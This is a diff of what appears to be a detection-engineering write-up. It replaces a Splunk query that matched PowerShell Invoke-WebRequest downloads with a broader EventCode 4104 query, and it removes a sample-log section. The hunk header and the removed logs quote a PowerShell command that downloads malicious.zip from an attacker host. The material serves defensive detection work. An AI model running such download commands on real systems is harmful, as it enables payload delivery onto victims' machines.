@@ -52,20 +52,11 @@ powershell -Command "Invoke-WebRequest -Uri http://<Attacker-IP>:8080/malicious.
 🔎 Detection Logic (Splunk SPL)
 
 ```spl
-index=win_logs (EventCode=4688 OR EventCode=1 OR EventCode=4104)
-| search CommandLine="*Invoke-WebRequest*" OR ScriptBlockText="*Invoke-WebRequest*"
-| table _time, ComputerName, User, CommandLine, ScriptBlockText
+index=* EventCode=4104
+| table _time, host, source, sourcetype, Message
+| sort -_time
 ```
 
----
-
-🧾 Sample Logs / IoCs
-
-```
-CommandLine: powershell -Command "Invoke-WebRequest -Uri http://192.168.1.100:8080/malicious.zip -OutFile C:\Users\Public\malicious.zip"
-ScriptBlockText: Invoke-WebRequest -Uri http://192.168.00.00:8080/malicious.zip
-File Created: C:\Users\Public\malicious.zip
-```
 
 ---
 
